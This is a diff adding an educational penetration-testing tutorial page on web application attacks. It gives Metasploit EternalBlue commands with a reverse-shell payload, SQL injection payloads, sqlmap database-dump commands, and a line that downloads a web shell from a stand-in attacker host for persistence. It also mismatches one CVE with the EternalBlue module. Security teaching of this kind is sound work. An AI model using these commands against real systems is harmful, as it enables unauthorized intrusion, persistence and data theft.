@@ -1,0 +1,316 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Web Application Penetration Testing</title>
+    <link rel="stylesheet" href="main.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.0.0/crypto-js.min.js"></script>
+</head>
+<body>
+    <!-- Dropdown Menu HTML to be added to each page -->
+    <div class="dropdown-menu-container">
+        <button class="dropdown-toggle" onclick="toggleDropdownMenu()">Menu</button>
+        <div class="dropdown-menu" id="dropdownMenu">
+            <a href="index.html">Home</a>
+            <a href="linux_basics.html">Linux Basics</a>
+            <a href="OSINT.html">OSINT</a>
+            <a href="social_engineering.html">Social Engineering</a>
+            <a href="nmap.html">Enumeration</a>
+            <a href="exploitation.html">Exploitation</a>
+            <a href="Webapp_Testing.html">Web Application Testing</a>
+            <a href="privilege_escalation.html">Privilege Escalation</a>
+            <a href="persistence.html">Persistence</a>
+            <a href="PasswordCracking.html">Password Cracking</a>
+            <a href="WPA2_Cracking.html">WPA2 Cracking</a>
+            <a href="additional_training.html">Additional Training</a>
+
+        </div>
+    </div>
+
+    <header>
+        <h1>Web Application Penetration Testing</h1> <!--By the way I SUCK at Webapp Pentesting-->
+    </header>
+
+    <section class="content">
+
+
+        <h2>Introduction to Web Application Penetration Testing</h2>
+        <p>Web application penetration testing is the process of attacking a web application to uncover security vulnerabilities, misconfigurations, and weaknesses that could be exploited by malicious actors. This type of testing plays a vital role in ensuring that applications are robust against threats like SQL injection, cross-site scripting (XSS), insecure authentication, and session management flaws. In this guide, we'll explore the tools and techniques used to assess web applications, including scanning for common vulnerabilities with tools like <strong>OWASP ZAP</strong> and <strong>Burp Suite</strong>, exploiting discovered weaknesses, and testing for logic flaws that automated tools may miss. We will also cover techniques for intercepting and analyzing web traffic, evaluating input validation, and testing the security of application components like APIs. The goal is to ethically discover and document vulnerabilities, following a responsible disclosure process to ensure that they are addressed before they can be exploited in the wild, improving the overall security posture of the application.
+        </p>
+
+        <div class="video-container">
+            <iframe width="560" height="315" src="https://www.youtube.com/embed/INJy5tLGkzA?si=_hFG9rBtZMPeNwDG" title="YouTube video player" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
+        </div>
+        <div>
+            <p>Video Credit: <strong>Loi Liang Yang</strong>- Website Hacking</p>
+        </div>
+
+        <h2>Reconnaissance and Information Gathering</h2>
+        <p>Reconnaissance is the first step of web application penetration testing, where you gather as much information as possible about the target web application.</p>
+
+        <h3>Using Nmap to Scan a Website</h3>
+        <p>Nmap can be used to scan websites and gather information such as open ports and services running on the server. The following command can be used to scan a target website:</p>
+        <div class="terminal">
+            <pre>nmap -sV -p- -A example.com</pre>
+        </div>
+        <p>Explanation:</p>
+        <ul>
+            <li><code>-sV</code>: Service version detection</li>
+            <li><code>-p-</code>: Scan all 65535 ports</li>
+            <li><code>-A</code>: Enables OS detection, version detection, script scanning, and traceroute</li>
+        </ul>
+        <p>This command helps in identifying which services are running and which versions are being used, which is crucial for detecting vulnerabilities.</p>
+
+        <h3>Finding Domains and Subdomains</h3>
+        <p>Finding subdomains is important because they can reveal hidden parts of an application that may be less secure. The following tools are commonly used for subdomain enumeration:</p>
+        <ul>
+            <li><strong>Sublist3r</strong>: A powerful subdomain enumeration tool.</li>
+            <li><strong>Amass</strong>: A tool used to perform DNS enumeration, scraping, and analysis.</li>
+        </ul>
+        <p>Using Sublist3r to find subdomains:</p>
+        <div class="terminal">
+            <pre>python sublist3r.py -d example.com</pre>
+        </div>
+        <p>Example output:</p>
+        <div class="terminal">
+            <pre>
+[+] Enumerating subdomains for example.com
+www.example.com
+mail.example.com
+admin.example.com
+api.example.com</pre>
+        </div>
+
+        <h3>Directory Enumeration with Gobuster</h3>
+        <p>Directory enumeration helps to discover hidden files and directories that may contain sensitive information or be vulnerable to attacks. Gobuster is a popular tool for performing directory enumeration on a target website.</p>
+        <h4>Using Gobuster for Directory Enumeration</h4>
+        <p>To use Gobuster with a wordlist to find directories on a target website, use the following command:</p>
+        <div class="terminal">
+            <pre>gobuster dir -u http://example.com -w /usr/share/seclists/Discovery/Web-Content/common.txt</pre>
+        </div>
+        <p>Explanation:</p>
+        <ul>
+            <li><code>dir</code>: Mode for directory enumeration.</li>
+            <li><code>-u</code>: Specifies the URL to scan.</li>
+            <li><code>-w</code>: Specifies the wordlist to use. In this case, the wordlist is <code>/usr/share/seclists/Discovery/Web-Content/common.txt</code>.</li>
+        </ul>
+        <p>Gobuster will attempt to find hidden directories and files on the target site using the specified wordlist. This can help reveal areas of the web application that may be vulnerable.</p>
+
+        <h2>Identifying Vulnerabilities</h2>
+        <h3>Scanning with Nikto</h3>
+        <p>Nikto is a web server scanner that identifies vulnerabilities, outdated software, and configuration issues. It can be a crucial tool for penetration testers and security professionals looking to find weaknesses in web servers and applications. Nikto scans for over 6,700 potentially dangerous files, outdated server versions, and configuration issues that could lead to vulnerabilities. It also checks for common files like admin panels and default login pages, which could be exploited if left unprotected.</p>
+        <div class="terminal">
+            <pre>nikto -h http://example.com</pre>
+        </div>
+        <p>Example output:</p>
+        <div class="terminal">
+            <pre>
+        - Nikto v2.1.6
+        -----------------------------------------------------------------------
+        + Target IP:       192.168.1.10
+        + Target Hostname: example.com
+        + Target Port:     80
+        -----------------------------------------------------------------------
+        + Server: Apache/2.4.41 (Ubuntu)
+        + The X-Frame-Options header is not present, vulnerability detected.
+        + Outdated software detected: Apache/2.4.41
+        + Entry '/admin/' is password protected, brute force possible.
+        -----------------------------------------------------------------------</pre>
+        </div>
+
+        <h3>Steps to Take if a Vulnerability is Found</h3>
+        <p>If vulnerabilities are found during a Nikto scan, it's important to address them as soon as possible to mitigate the risk of attack. Here are the steps you should take:</p>
+        
+        <section>
+            <h3>Exploiting Vulnerabilities Found During Scans</h3>
+            <p>After performing a scan with tools like Nmap, Nikto, or Nessus, vulnerabilities may be uncovered in software versions, misconfigurations, or exposed services. The next step is to understand how these vulnerabilities can be exploited to gain unauthorized access or compromise the system.</p>
+        
+            <ul>
+                <li><strong>What You Should Look For:</strong> Outdated software, exposed services, or weak configurations that are flagged as vulnerable. This can include software like Apache, Nginx, MySQL, and others. The <a href="https://cve.mitre.org/" target="_blank">CVE Database</a> and <a href="https://www.exploit-db.com/" target="_blank">Exploit-DB</a> are great resources for checking known vulnerabilities (CVE) and finding available exploits.</li>
+        
+                <li><strong>Steps to Take:</strong> 
+                    <p>Once you've identified vulnerabilities, you can use a penetration testing framework like <a href="https://www.metasploit.com/" target="_blank">Metasploit</a> to exploit them.</p>
+        
+                    p>To start Metasploit, use the following command:</p>
+                    <div class="terminal">
+                        <pre>msfconsole</pre>
+                    </div>
+                    
+                    <p>To search for a specific vulnerability using its CVE identifier, use the following command:</p>
+                    <div class="terminal">
+                        <pre>search cve:2020-1472</pre>
+                    </div>
+                    
+                    <p>To select the exploit module for the specific vulnerability, use this command:</p>
+                    <div class="terminal">
+                        <pre>use exploit/windows/smb/ms17_010_eternalblue</pre>
+                    </div>
+                    
+                    <p>Set the target host IP address by using the following command:</p>
+                    <div class="terminal">
+                        <pre>set RHOST 192.168.1.100</pre>
+                    </div>
+                    
+                    <p>Set other parameters such as the payload to be used. In this case, we're using a reverse TCP payload:</p>
+                    <div class="terminal">
+                        <pre>set payload windows/x64/meterpreter/reverse_tcp</pre>
+                    </div>
+                    
+                    <p>Set your local host (the attacker machine) IP address:</p>
+                    <div class="terminal">
+                        <pre>set LHOST 192.168.1.50</pre>
+                    </div>
+                    
+                    <p>Finally, run the exploit with the following command:</p>
+                    <div class="terminal">
+                        <pre>exploit</pre>
+                    </div>
+                    
+        
+                    <p>This example demonstrates exploiting the famous MS17-010 EternalBlue vulnerability using Metasploit. Always check for an appropriate exploit module based on the CVE found in your scan results.</p>
+                </li>
+        
+                <li><strong>Using Manual Exploits:</strong> 
+                    <p>Not every vulnerability will have an automatic exploit in Metasploit. For those that don't, you may need to download and run manual scripts or tools. Exploit-DB is an excellent place to find these. For example:</p>
+                    <div class="terminal">
+                        <pre>wget https://www.exploit-db.com/download/45270</pre>
+                    </div>
+                    
+                    <p>After downloading an exploit, you may need to compile or run the script. Here is an example of running a Python script:</p>
+                    <div class="terminal">
+                        <pre>python3 exploit_script.py -t 192.168.1.100</pre>
+                    </div>
+                    
+                    <p>Before running any exploit, be sure to carefully review its code and understand its behavior to avoid damaging the target or triggering unintended side effects.</p>
+                    
+                    <h3>Privilege Escalation</h3>
+                    <p>After gaining initial access, the next step is to elevate your privileges to an administrator or root user. This can be done by exploiting weak configurations or other software vulnerabilities. Tools like <a href="https://github.com/carlospolop/PEASS-ng" target="_blank">LinPEAS</a> and <a href="https://gtfobins.github.io/" target="_blank">GTFOBins</a> can help identify privilege escalation vectors.</p>
+                    
+                    <p>To run LinPEAS and identify potential privilege escalation opportunities, use the following command:</p>
+                    <div class="terminal">
+                        <pre>./linpeas.sh</pre>
+                    </div>
+                    
+                    <h3>SQL Injection (SQLi)</h3>
+                    <p>SQL Injection (SQLi) is a type of attack that allows an attacker to execute arbitrary SQL queries against a database by injecting malicious input into the application. This type of attack can lead to unauthorized access to sensitive data, data modification, or even full control over the database server.</p>
+                    
+                    <p><strong>Identifying SQL Injection Vulnerabilities</strong></p>
+                    <p>SQL injection vulnerabilities are typically found in user input fields such as login forms, search boxes, or any input that directly interacts with a backend database. The following are some methods to identify potential SQL injection points:</p>
+                    <ul>
+                        <li><strong>Single Quote Test:</strong> Enter a single quote (<code>'</code>) into input fields and observe any errors that may indicate improper input handling. If an error similar to <code>SQL syntax error</code> appears, the field may be vulnerable to SQL injection.</li>
+                        <li><strong>Boolean-Based Testing:</strong> Use logical operators to test for a difference in response. For example, enter <code>' OR 1=1 --</code> to see if it returns a valid response, indicating a possible vulnerability.</li>
+                    </ul>
+                    
+                    <p><strong>Exploiting SQL Injection</strong></p>
+                    <p>Once a potential SQL injection vulnerability has been identified, the next step is to exploit it to extract data from the database or gain control over the system. Below are some common exploitation techniques:</p>
+                    
+                    <p><strong>1. Extracting Database Information</strong></p>
+                    <p>Use a payload to determine the database version, current user, and available tables:</p>
+                    <div class="terminal">
+                        <pre>http://example.com/vulnerable_page.php?id=1 UNION SELECT null, version(), user(), database() --</pre>
+                    </div>
+                    <p>The above payload uses a <code>UNION SELECT</code> statement to extract information about the database version, user, and current database name.</p>
+                    
+                    <p><strong>2. Using Automated Tools</strong></p>
+                    <p>Manual SQL injection can be time-consuming. To automate the exploitation process, use tools like <a href="https://github.com/sqlmapproject/sqlmap" target="_blank">sqlmap</a>:</p>
+                    <div class="terminal">
+                        <pre>sqlmap -u "http://example.com/vulnerable_page.php?id=1" --dbs</pre>
+                    </div>
+                    <p>This command tells sqlmap to target the vulnerable page and enumerate the available databases.</p>
+                    
+                    <p><strong>3. Extracting Table Data</strong></p>
+                    <p>Once the databases have been identified, you can extract table names and column information:</p>
+                    <div class="terminal">
+                        <pre>sqlmap -u "http://example.com/vulnerable_page.php?id=1" -D database_name --tables</pre>
+                    </div>
+                    <p>Replace <code>database_name</code> with the actual name of the target database. This command will list all tables in the specified database.</p>
+                    
+                    <p>To extract specific columns from a table:</p>
+                    <div class="terminal">
+                        <pre>sqlmap -u "http://example.com/vulnerable_page.php?id=1" -D database_name -T table_name --columns</pre>
+                    </div>
+                    <p>Replace <code>table_name</code> with the name of the table you want to investigate.</p>
+                    
+                    <p>Finally, extract data from a column:</p>
+                    <div class="terminal">
+                        <pre>sqlmap -u "http://example.com/vulnerable_page.php?id=1" -D database_name -T table_name -C column_name --dump</pre>
+                    </div>
+                    <p>This command dumps the content of the specified column.</p>
+                    
+                    <p><strong>SQL injection attacks can have severe consequences if performed improperly or maliciously.</strong></p>
+                    
+                    
+        
+                    <h3>Post-Exploitation (Web Application)</h3>
+                    <p>Once you have gained control over a web application, post-exploitation tasks are focused on extracting sensitive data, maintaining access, and exploring the underlying infrastructure to understand the full extent of the compromise. The main goals of post-exploitation for web applications include:</p>
+                    <ul>
+                        <li><strong>Data Extraction:</strong> Extracting sensitive data, such as database content, API keys, user credentials, and configuration files.</li>
+                        <li><strong>Establishing Persistence:</strong> Deploying web shells, backdoors, or modifying application files to maintain persistent access.</li>
+                        <li><strong>Further Network Exploration:</strong> Using compromised credentials or connections to explore the internal network and identify additional systems.</li>
+                    </ul>
+                    
+                    <h3>Common Post-Exploitation Techniques for Web Applications</h3>
+                    <p>Below are some common techniques and tools used for post-exploitation tasks once a web application has been compromised:</p>
+                    
+                    <p><strong>1. Extracting Sensitive Information</strong></p>
+                    <p>Once you have access, the first step is to identify and extract sensitive information from the web server. This can include:</p>
+                    <ul>
+                        <li><strong>Database Dumping:</strong> Use tools like <a href="https://github.com/sqlmapproject/sqlmap" target="_blank">sqlmap</a> to extract the entire contents of the backend database. For example:</p>
+                        <div class="terminal">
+                            <pre>sqlmap -u "http://example.com/vulnerable_endpoint" --dump</pre>
+                        </div>
+                        <p>This command dumps all available data from the vulnerable endpoint of the web application.</p>
+                        <li><strong>Configuration Files:</strong> Look for configuration files (e.g., <code>config.php</code>) that may contain sensitive information such as database credentials or API keys.</li>
+                    </ul>
+                    
+                    <p><strong>2. Web Shell Deployment for Persistence</strong></p>
+                    <p>Maintaining access is a key goal in post-exploitation. One way to achieve persistence is by uploading a web shell. This allows remote command execution on the compromised server.</p>
+                    <div class="terminal">
+                        <pre>wget http://attacker.com/shell.php -O /var/www/html/shell.php</pre>
+                    </div>
+                    <p>In this example, a web shell named <code>shell.php</code> is uploaded to the web root directory. This allows for continued remote control of the server using a simple web-based interface.</p>
+                    
+                    <p>Another example is using <a href="https://github.com/tennc/webshell" target="_blank">popular web shells</a> that support various features such as command execution, file browsing, and database access.</p>
+                    
+                    <p><strong>3. Privilege Escalation on the Web Server</strong></p>
+                    <p>If the compromised web server has limited privileges, the next step is to escalate privileges to gain full administrative control. You can use tools like:</p>
+                    <ul>
+                        <li><a href="https://gtfobins.github.io/" target="_blank">GTFOBins</a> - Identifies Linux binaries that can be exploited for privilege escalation.</li>
+                        <li><a href="https://github.com/carlospolop/PEASS-ng" target="_blank">LinPEAS</a> - Scans the system to identify potential privilege escalation vectors.</li>
+                    </ul>
+                    <p>Run LinPEAS to look for vulnerabilities that can be exploited to elevate privileges:</p>
+                    <div class="terminal">
+                        <pre>./linpeas.sh</pre>
+                    </div>
+                    
+                    <p><strong>4. Further Network Exploration</strong></p>
+                    <p>After compromising a web application, it is important to explore the underlying network to find other valuable targets. This can involve:</p>
+                    <ul>
+                        <li><strong>Pivoting:</strong> Using compromised web servers as a stepping stone to access other internal systems.</li>
+                        <li><strong>Port Scanning:</strong> Use tools like <a href="https://nmap.org/" target="_blank">Nmap</a> to scan internal network ranges for other active services:</p>
+                        <div class="terminal">
+                            <pre>nmap -sT -p- 192.168.1.0/24</pre>
+                        </div>
+                        <p>This command scans the entire subnet to identify other potentially vulnerable systems.</p>
+                    </ul>
+        
+                <li><strong>Staying Updated:</strong> 
+                    <p>Vulnerabilities are discovered frequently, and it’s important to stay informed about new ones. Regularly visit sources like:</p>
+                    <ul>
+                        <li><a href="https://nvd.nist.gov/" target="_blank">NVD (National Vulnerability Database)</a></li>
+                        <li><a href="https://www.exploit-db.com/" target="_blank">Exploit-DB</a></li>
+                        <li><a href="https://cve.mitre.org/" target="_blank">CVE Mitre Database</a></li>
+                    </ul>
+                </li>
+            </ul>
+        </section>    
+    </section>
+<footer>
+        <p>Disclaimer: This tutorial is intended for educational purposes only. Unauthorized access to systems or networks is illegal. Always obtain permission before performing any penetration testing.</p>
+    </footer>
+
+    <!-- JavaScript for dropdown functionality -->
+    <script src="main.js"></script>
+</body>
+</html>
